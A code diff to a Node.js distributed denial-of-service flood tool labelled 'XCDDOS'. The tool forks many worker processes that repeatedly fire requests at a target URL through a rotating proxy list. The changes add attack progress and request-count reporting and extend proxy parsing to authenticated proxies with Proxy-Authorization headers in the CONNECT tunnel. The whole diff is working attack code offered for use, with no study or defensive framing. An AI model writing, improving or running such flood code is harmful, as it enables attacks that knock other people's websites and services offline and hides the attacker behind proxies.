@@ -252,23 +252,70 @@ const secureOptions =
  var proxies = readLines(args.proxyFile);
  const parsedTarget = new URL(args.target);
 
- if (cluster.isMaster) {
-    for (let counter = 1; counter <= args.threads; counter++) {
-    console.clear()
+if (cluster.isMaster) {
+    console.clear();
     console.log("XCDDOS ATTACK SENT ".bgRed);
-    process.stdout.write("Loading: 10%\n".blue);
-setTimeout(() => {
-  process.stdout.write("\rLoading: 50%\n".blue);
-}, 500 * process.argv[3] );
-
-setTimeout(() => {
-  process.stdout.write("\rLoading: 100%\n".blue);
-}, process.argv[3] * 1000);
+    console.log(`Target: ${args.target}`.yellow);
+    console.log(`Duration: ${args.time}s | Rate: ${args.Rate} req/thread | Threads: ${args.threads}`.yellow);
+    console.log(`Method: ${args.mdata}`.yellow);
+    console.log("");
+    
+    process.stdout.write("Loading: 10%".blue);
+    
+    for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
-
+        if (counter % Math.floor(args.threads / 10) === 0) {
+            const progress = Math.floor((counter / args.threads) * 90) + 10;
+            process.stdout.write(`\rLoading: ${progress}%`.blue);
+        }
     }
-} else {for (let i = 0; i < args.Rate; i++) 
-    { setInterval(runFlooder) }}
+    
+    process.stdout.write("\rLoading: 100%\n".green);
+    console.log(`\n✓ ${args.threads} workers launched. Attack in progress...\n`.green);
+    
+    setTimeout(() => {
+        process.stdout.write("\r[50%] Attack at midpoint...".yellow);
+    }, (args.time * 1000) / 2);
+    
+    setTimeout(() => {
+        process.stdout.write("\r[100%] Attack completed!\n".green);
+    }, args.time * 1000);
+    
+    let requestCount = 0;
+    let errorCount = 0;
+    
+    cluster.on('message', (worker, message) => {
+        if (message.type === 'request') {
+            requestCount++;
+            if (requestCount % 1000 === 0) {
+                process.stdout.write(`\r[STATS] Requests: ${requestCount} | Errors: ${errorCount}`.cyan);
+            }
+        } else if (message.type === 'error') {
+            errorCount++;
+        }
+    });
+    
+} else {
+    let localRequestCount = 0;
+    let localErrorCount = 0;
+    
+    for (let i = 0; i < args.Rate; i++) {
+        setInterval(() => {
+            try {
+                runFlooder();
+                localRequestCount++;
+                if (localRequestCount % 100 === 0) {
+                    process.send({ type: 'request', count: localRequestCount });
+                }
+            } catch (error) {
+                localErrorCount++;
+                if (localErrorCount % 10 === 0) {
+                    process.send({ type: 'error', count: localErrorCount });
+                }
+            }
+        }, 500);
+    }
+}
 
 
  class NetSocket {
@@ -277,7 +324,12 @@ setTimeout(() => {
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
-     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
+     let payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive";
+     if (options.user && options.pass) {
+         const auth = Buffer.from(options.user + ":" + options.pass).toString("base64");
+         payload += "\r\nProxy-Authorization: Basic " + auth;
+     }
+     payload += "\r\n\r\n";
      const buffer = new Buffer.from(payload);
      const connection = net.connect({
         host: options.host,
@@ -374,8 +426,24 @@ return result;
 }
 const randstrsValue = randstrs(10);
   function runFlooder() {
-    const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(":");
+    const proxyAddr = randomElement(proxies).trim();
+    if (!proxyAddr) return;
+    
+    let proxyHost, proxyPort, proxyUser, proxyPass;
+    
+    if (proxyAddr.includes("@")) {
+      const [auth, hostPort] = proxyAddr.split("@");
+      [proxyUser, proxyPass] = auth.split(":");
+      const [host, port] = hostPort.split(":");
+      proxyHost = host;
+      proxyPort = parseInt(port) || 1080;
+    } else {
+      const parts = proxyAddr.split(":");
+      proxyHost = parts[0];
+      proxyPort = parseInt(parts[1]) || 1080;
+    }
+    
+    const parsedProxy = [proxyHost, proxyPort, proxyUser, proxyPass];
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
     const nm = [
       "110.0.0.0",
@@ -558,7 +626,9 @@ let headers = {
 
  const proxyOptions = {
      host: parsedProxy[0],
-     port: ~~parsedProxy[1],
+     port: parsedProxy[1],
+     user: parsedProxy[2],
+     pass: parsedProxy[3],
      address: parsedTarget.host + ":443",
      timeout: 25
  };
